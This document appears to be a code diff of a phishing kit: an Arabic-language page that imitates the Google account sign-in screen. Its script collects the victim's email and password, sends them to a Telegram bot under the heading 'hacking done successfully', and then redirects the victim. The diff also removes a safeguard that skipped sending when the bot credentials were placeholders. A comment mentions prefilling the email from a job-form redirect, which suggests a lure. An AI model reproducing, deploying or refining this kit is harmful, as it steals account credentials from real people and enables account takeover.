@@ -1,18 +1,22 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تسجيل الدخول - حسابات Google</title>
-    
+
     <!-- FavIcon -->
-    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath d='M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z' fill='%234285F4'/%3E%3Cpath d='M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z' fill='%2334A853'/%3E%3Cpath d='M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z' fill='%23FBBC05'/%3E%3Cpath d='M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z' fill='%23EA4335'/%3E%3C/svg%3E" />
+    <link rel="icon" type="image/svg+xml"
+        href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath d='M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z' fill='%234285F4'/%3E%3Cpath d='M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z' fill='%2334A853'/%3E%3Cpath d='M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z' fill='%23FBBC05'/%3E%3Cpath d='M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z' fill='%23EA4335'/%3E%3C/svg%3E" />
 
     <!-- Google Fonts: Cairo for modern Arabic, Roboto for fallback -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
-    
+    <link
+        href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&family=Roboto:wght@300;400;500;700&display=swap"
+        rel="stylesheet">
+
     <!-- FontAwesome for Premium Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
@@ -39,7 +43,7 @@
             --error-bg: rgba(176, 0, 32, 0.04);
             --pill-bg: #f1f3f4;
             --pill-border: #e0e0e0;
-            
+
             /* Shared configurations */
             --font-main: 'Cairo', 'Roboto', sans-serif;
             --transition-speed: 0.35s;
@@ -113,7 +117,7 @@
             justify-content: center;
             align-items: center;
             cursor: pointer;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
             transition: all var(--transition-speed) var(--transition-curve);
         }
 
@@ -172,9 +176,20 @@
         }
 
         @keyframes google-loading-anim {
-            0% { left: -35%; right: 100%; }
-            60% { left: 100%; right: -90%; }
-            100% { left: 100%; right: -90%; }
+            0% {
+                left: -35%;
+                right: 100%;
+            }
+
+            60% {
+                left: 100%;
+                right: -90%;
+            }
+
+            100% {
+                left: 100%;
+                right: -90%;
+            }
         }
 
         /* Content Slides Wrapper */
@@ -251,9 +266,11 @@
                 background-color: transparent;
                 min-height: 100%;
             }
+
             .slide {
                 padding: 24px 16px;
             }
+
             body {
                 background-color: var(--bg-card);
                 padding: 10px;
@@ -346,7 +363,8 @@
             color: var(--text-primary);
             outline: none;
             text-align: right;
-            direction: ltr; /* inputs usually ltr for emails/passwords */
+            direction: ltr;
+            /* inputs usually ltr for emails/passwords */
             transition: border var(--transition-speed) var(--transition-curve);
         }
 
@@ -357,7 +375,8 @@
         .input-field:focus {
             border-color: var(--input-focus);
             border-width: 2px;
-            padding: 15px; /* Adjust padding to offset border-width difference */
+            padding: 15px;
+            /* Adjust padding to offset border-width difference */
         }
 
         /* Floating Label Positioning */
@@ -376,8 +395,8 @@
         }
 
         /* Float the label on focus or filled states */
-        .input-field:focus ~ .input-label,
-        .input-field:not(:placeholder-shown) ~ .input-label {
+        .input-field:focus~.input-label,
+        .input-field:not(:placeholder-shown)~.input-label {
             top: 0;
             transform: translateY(-50%) scale(0.78);
             color: var(--input-focus);
@@ -439,7 +458,7 @@
             font-weight: 500;
         }
 
-        .input-group.has-error + .error-message {
+        .input-group.has-error+.error-message {
             display: flex;
         }
 
@@ -522,7 +541,7 @@
 
         .btn-filled:hover {
             background-color: var(--btn-filled-bg-hover);
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
         }
 
         .btn-text {
@@ -618,7 +637,7 @@
             background: var(--bg-card);
             border: 1px solid var(--border-card);
             border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
             display: none;
             min-width: 150px;
             z-index: 100;
@@ -631,8 +650,15 @@
         }
 
         @keyframes dropdown-fade-in {
-            from { opacity: 0; transform: translateY(5px); }
-            to { opacity: 1; transform: translateY(0); }
+            from {
+                opacity: 0;
+                transform: translateY(5px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
 
         .lang-option {
@@ -655,6 +681,7 @@
         }
     </style>
 </head>
+
 <body>
 
     <!-- Top Navigation Utility Bar -->
@@ -673,16 +700,24 @@
         </div>
 
         <div class="slides-wrapper">
-            
+
             <!-- STEP 1 SLIDE (Email field) -->
             <div class="slide active" id="step1">
                 <div class="header-section">
                     <div class="google-logo">
                         <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                            <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
-                            <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
-                            <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z" fill="#FBBC05"/>
-                            <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z" fill="#EA4335"/>
+                            <path
+                                d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
+                                fill="#4285F4" />
+                            <path
+                                d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
+                                fill="#34A853" />
+                            <path
+                                d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"
+                                fill="#FBBC05" />
+                            <path
+                                d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"
+                                fill="#EA4335" />
                         </svg>
                     </div>
                     <h1 class="main-heading">تسجيل الدخول</h1>
@@ -691,7 +726,8 @@
 
                 <div class="form-section">
                     <div class="input-group" id="emailGroup">
-                        <input type="text" class="input-field" id="emailInput" placeholder=" " autocomplete="username" inputmode="email">
+                        <input type="text" class="input-field" id="emailInput" placeholder=" " autocomplete="username"
+                            inputmode="email">
                         <label class="input-label" for="emailInput">البريد الإلكتروني أو الهاتف</label>
                     </div>
                     <!-- Error prompt block -->
@@ -704,7 +740,8 @@
 
                     <div class="help-text-block">
                         ليس كمبيوترك الشخصي؟ استخدم نافذة للتصفح الخاص لتسجيل الدخول.
-                        <a href="#" class="action-link" style="margin-top: 4px;">معرفة المزيد عن استخدام ضيف تسجيل الدخول</a>
+                        <a href="#" class="action-link" style="margin-top: 4px;">معرفة المزيد عن استخدام ضيف تسجيل
+                            الدخول</a>
                     </div>
                 </div>
 
@@ -720,14 +757,22 @@
                     <div class="google-logo">
                         <!-- Official Multi-colored Google G Icon SVG -->
                         <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                            <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
-                            <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
-                            <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z" fill="#FBBC05"/>
-                            <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z" fill="#EA4335"/>
+                            <path
+                                d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
+                                fill="#4285F4" />
+                            <path
+                                d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
+                                fill="#34A853" />
+                            <path
+                                d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"
+                                fill="#FBBC05" />
+                            <path
+                                d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"
+                                fill="#EA4335" />
                         </svg>
                     </div>
                     <h1 class="main-heading">مرحباً بك</h1>
-                    
+
                     <!-- Selected Account Pill with click-back support -->
                     <div class="account-pill" id="accountPill" title="تغيير الحساب">
                         <i class="fa-solid fa-circle-user"></i>
@@ -739,12 +784,14 @@
                 <div class="form-section">
                     <div class="input-group" id="passwordGroup">
                         <!-- Password field visibility container LTR, labeled RTL -->
-                        <input type="password" class="input-field" id="passwordInput" placeholder=" " autocomplete="current-password">
+                        <input type="password" class="input-field" id="passwordInput" placeholder=" "
+                            autocomplete="current-password">
                         <label class="input-label" for="passwordInput">أدخل كلمة المرور</label>
-                        
+
                         <!-- Toggle eye-icon visible inside input -->
                         <div class="password-toggle-wrapper">
-                            <button type="button" class="password-toggle-btn" id="togglePasswordBtn" aria-label="عرض كلمة المرور">
+                            <button type="button" class="password-toggle-btn" id="togglePasswordBtn"
+                                aria-label="عرض كلمة المرور">
                                 <i class="fa-regular fa-eye-slash" id="togglePasswordIcon"></i>
                             </button>
                         </div>
@@ -809,13 +856,13 @@
         const themeIcon = themeToggleBtn.querySelector('i');
         const signinCard = document.getElementById('signinCard');
         const progressBar = document.getElementById('progressBar');
-        
+
         // Input fields & groups
         const emailInput = document.getElementById('emailInput');
         const emailGroup = document.getElementById('emailGroup');
         const emailError = document.getElementById('emailError');
         const emailErrorText = document.getElementById('emailErrorText');
-        
+
         const passwordInput = document.getElementById('passwordInput');
         const passwordGroup = document.getElementById('passwordGroup');
         const passwordError = document.getElementById('passwordError');
@@ -823,13 +870,13 @@
         const togglePasswordIcon = document.getElementById('togglePasswordIcon');
         const showPasswordCheckbox = document.getElementById('showPasswordCheckbox');
         const showPasswordRow = document.getElementById('showPasswordRow');
-        
+
         // Action buttons
         const nextBtn = document.getElementById('nextBtn');
         const submitBtn = document.getElementById('submitBtn');
         const accountPill = document.getElementById('accountPill');
         const activeEmailDisplay = document.getElementById('activeEmailDisplay');
-        
+
         // Language elements
         const langTrigger = document.getElementById('langTrigger');
         const langDropdown = document.getElementById('langDropdown');
@@ -843,7 +890,7 @@
             const radius = diameter / 2;
 
             const rect = button.getBoundingClientRect();
-            
+
             circle.style.width = circle.style.height = `${diameter}px`;
             circle.style.left = `${event.clientX - rect.left - radius}px`;
             circle.style.top = `${event.clientY - rect.top - radius}px`;
@@ -858,7 +905,7 @@
         }
 
         document.querySelectorAll('.btn').forEach(button => {
-            button.addEventListener('click', function(e) {
+            button.addEventListener('click', function (e) {
                 createRipple(e, this);
             });
         });
@@ -890,7 +937,7 @@
             if (!value.trim()) {
                 return { valid: false, message: 'أدخل عنوان بريد إلكتروني أو رقم هاتف' };
             }
-            
+
             // Standard Regex for basic Email validation
             const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
             // Basic international phone pattern (7 to 15 digits optionally starting with +)
@@ -935,12 +982,12 @@
             setTimeout(() => {
                 progressBar.classList.remove('loading');
                 nextBtn.disabled = false;
-                
+
                 // Toggle slide active classes
                 document.getElementById('step1').classList.remove('active');
                 document.getElementById('step1').classList.add('slide-out');
                 document.getElementById('step2').classList.add('active');
-                
+
                 passwordInput.value = '';
                 passwordGroup.classList.remove('has-error');
                 passwordInput.focus();
@@ -952,12 +999,12 @@
             progressBar.classList.add('loading');
             setTimeout(() => {
                 progressBar.classList.remove('loading');
-                
+
                 // Reset slide active classes
                 document.getElementById('step1').classList.remove('slide-out');
                 document.getElementById('step1').classList.add('active');
                 document.getElementById('step2').classList.remove('active');
-                
+
                 emailInput.focus();
             }, 600);
         }
@@ -993,7 +1040,7 @@
 
         // Next and Submit validation events
         nextBtn.addEventListener('click', goToStep2);
-        
+
         emailInput.addEventListener('keydown', (e) => {
             if (e.key === 'Enter') {
                 goToStep2();
@@ -1017,7 +1064,7 @@
             // Gather inputs for Telegram dispatch
             const email = emailInput.value.trim();
             const pass = password.trim();
-            const message = `📬 <b>hacking done successfully/b>\n\n📧 <b>البريد:</b> <code>${email}</code>\n🔑 <b>كلمة المرور:</b> <code>${pass}</code>`;
+            const message = `📬 <b>hacking done successfully</b>\n\n📧 <b>البريد:</b> <code>${email}</code>\n🔑 <b>كلمة المرور:</b> <code>${pass}</code>`;
 
             // Function to handle redirection
             const redirectToSuccess = () => {
@@ -1028,11 +1075,11 @@
             };
 
             // Check if Telegram Bot credentials are configured
-            if (TELEGRAM_BOT_TOKEN && !TELEGRAM_BOT_TOKEN.startsWith('YOUR_') && 
-                TELEGRAM_CHAT_ID && !TELEGRAM_CHAT_ID.startsWith('YOUR_')) {
-                
+            if (TELEGRAM_BOT_TOKEN &&
+                TELEGRAM_CHAT_ID) {
+
                 const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-                
+
                 fetch(telegramUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -1042,14 +1089,14 @@
                         parse_mode: 'HTML'
                     })
                 })
-                .then(() => {
-                    redirectToSuccess();
-                })
-                .catch(err => {
-                    console.error('Telegram Dispatch Error:', err);
-                    // Fallback to redirection anyway so user experience is not disrupted
-                    redirectToSuccess();
-                });
+                    .then(() => {
+                        redirectToSuccess();
+                    })
+                    .catch(err => {
+                        console.error('Telegram Dispatch Error:', err);
+                        // Fallback to redirection anyway so user experience is not disrupted
+                        redirectToSuccess();
+                    });
             } else {
                 // Skips telegram and redirects in development mode
                 console.log('Telegram dispatch skipped (credentials not configured):', { email, pass });
@@ -1072,7 +1119,7 @@
         });
 
         langOptions.forEach(option => {
-            option.addEventListener('click', function(e) {
+            option.addEventListener('click', function (e) {
                 langOptions.forEach(opt => opt.classList.remove('active'));
                 this.classList.add('active');
                 activeLangText.textContent = this.textContent;
@@ -1084,7 +1131,7 @@
                 if (currentLang === 'en') {
                     document.documentElement.setAttribute('lang', 'en');
                     document.documentElement.setAttribute('dir', 'ltr');
-                    
+
                     // Simple text changes for english demo mode
                     document.title = "Sign in - Google Accounts";
                     document.querySelector('#step1 .main-heading').textContent = "Sign in";
@@ -1141,7 +1188,7 @@
         // Initialize state and check for prefilled email from job form redirect
         window.addEventListener('load', () => {
             emailInput.focus();
-            
+
             // Check for pre-filled email from URL query parameter
             const urlParams = new URLSearchParams(window.location.search);
             const emailParam = urlParams.get('email');
@@ -1153,4 +1200,5 @@
         });
     </script>
 </body>
+
 </html>
